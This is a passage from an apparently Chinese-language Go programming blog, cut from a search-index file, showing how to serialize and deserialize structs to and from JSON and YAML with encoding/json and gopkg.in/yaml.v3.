class="hljs-string">&quot;%T\n&quot;</span>, data1) <span class="hljs-comment">// 打印出来的类型是无符号8位整形[]uint8，无正负符号8位整形</span><br>data2, _ := json.MarshalIndent(account, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot; &quot;</span>)<span class="hljs-comment">// MarshalIndent带缩进</span><br><br>fmt.Println(<span class="hljs-string">&quot;序列化后的data2=&quot;</span>, <span class="hljs-type">string</span>(data2))    <span class="hljs-comment">// 序列化后的data2= &#123;</span><br> <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;and&quot;</span>,<br> <span class="hljs-string">&quot;pwd&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<br> <span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-number">18</span><br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;data2的格式是：%T\n&quot;</span>, data2) <span class="hljs-comment">// []uint8</span><br><span class="hljs-comment">// 反序列化方法，就用json.Unmarshal()方法</span><br><span class="hljs-keyword">var</span> account2 Myaccount <span class="hljs-comment">// 定义一个变量account2，类型是Myaccount结构体</span><br>json.Ummarshal(data1,&amp;account2)<br>fmt.Println(<span class="hljs-string">&quot;account2=&quot;</span>, account2)<span class="hljs-comment">// account2=&#123;and 123 18&#125; ,打印出来的就是结构体了</span><br>fmt.Printf(<span class="hljs-string">&quot;%T\n&quot;</span>, account2) <span class="hljs-comment">// 类型就是main.Myaccount</span><br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 再写一个</span><br><span class="hljs-keyword">type</span> MyScore <span class="hljs-keyword">struct</span> &#123;<br>Name  <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;name&quot;`</span><br>Class <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;class&quot;`</span><br>Score <span class="hljs-type">int</span>    <span class="hljs-string">`json:&quot;score&quot;`</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    TomScore := MyScore&#123;<span class="hljs-string">&quot;Tom&quot;</span>, <span class="hljs-string">&quot;2班&quot;</span>, <span class="hljs-number">99</span>&#125;<br>fmt.Println(<span class="hljs-string">&quot;TomSocre=&quot;</span>, TomScore)<br><span class="hljs-comment">// 将TomScore进行序列化</span><br>JsonTomScore, _ := json.Marshal(TomScore)<br>fmt.Println(<span class="hljs-string">&quot;JsonTomScore=&quot;</span>, <span class="hljs-type">string</span>(JsonTomScore))<br><span class="hljs-comment">// 优化缩进后的</span><br>JsonTomScore2, _ := json.MarshalIndent(TomScore, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot; &quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;JsonTomScore2=&quot;</span>, <span class="hljs-type">string</span>(JsonTomScore2))<br><span class="hljs-comment">// 反序列化</span><br><span class="hljs-keyword">var</span> tom MyScore<br>json.Unmarshal(JsonTomScore, &amp;tom)<br>fmt.Println(<span class="hljs-string">&quot;tom=&quot;</span>, tom)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>序列化和反序列化，目前用到的是结构体类型数据转成json格式，和json格式转成结构体类型的数据</p></blockquote><h1 id="Yaml-序列化和反序列化（yaml与结构体互转）"><a href="#Yaml-序列化和反序列化（yaml与结构体互转）" class="headerlink" title="Yaml 序列化和反序列化（yaml与结构体互转）"></a>Yaml 序列化和反序列化（yaml与结构体互转）</h1><ul><li>思路和方式跟json的是一样的，只是用了一个库：**”gopkg.in&#x2F;yaml.v3”**</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;gopkg.in/yaml.v3&quot;</span><br><span class="hljs-string">&quot;io/ioutil&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> MyYAML <span class="hljs-keyword">struct</span> &#123;<br>Name  <span class="hljs-type">string</span> <span class="hljs-string">`yaml:&quot;name&quot;`</span><br>Age   <span class="hljs-type">int</span>    <span class="hljs-string">`yaml:&quot;age&quot;`</span><br>Email <span class="hljs-type">string</span> <span class="hljs-string">`yaml:&quot;email,omitempty&quot;`</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 序列化yaml 和序列化json一样的  yaml.Marshal</span><br>YamlStruct := MyYAML&#123;<span class="hljs-string">&quot;andy&quot;</span>, <span class="hljs-number">11</span>, <span class="hljs-string">&quot;110@163.com&quot;</span>&#125;<br>fmt.Println(<span class="hljs-string">&quot;YamlStruct=&quot;</span>, YamlStruct)<br>YamlDate, _ := yaml.Marshal(YamlStruct)<br>fmt.Println(<span class="hljs-string">&quot;YamlDate=&quot;</span>, <span class="hljs-type">string</span>(YamlDate))<br><span class="hljs-comment">// 下面反序列化yaml,也是和json一样思路，yaml.UnMarshal</span><br><span class="hljs-comment">// 不过在这之前你要有一个yaml文件，读取这个yaml文件后才能去打印出来</span><br>yamlDataFile, err := ioutil.ReadFile(<span class="hljs-string">&quot;data.yml&quot;</span>) <span class="hljs-comment">// 读取yml文件</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Failed to read YAML file: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">var</span> MyYamlStruct MyYAML<br>err = yaml.Unmarshal(yamlDataFile, &amp;MyYamlStruct) <span class="hljs-comment">// 把数据赋值到结构体里，用指针，改变他的值</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Failed to unmarshal YAML: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-comment">// 打印数据出来，</span><br>fmt.Printf(<span class="hljs-string">&quot;Name: %s, Age: %d, Email: %s\n&quot;</span>, MyYamlStruct.Name, MyYamlStruct.Age, MyYamlStruct.Email)<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
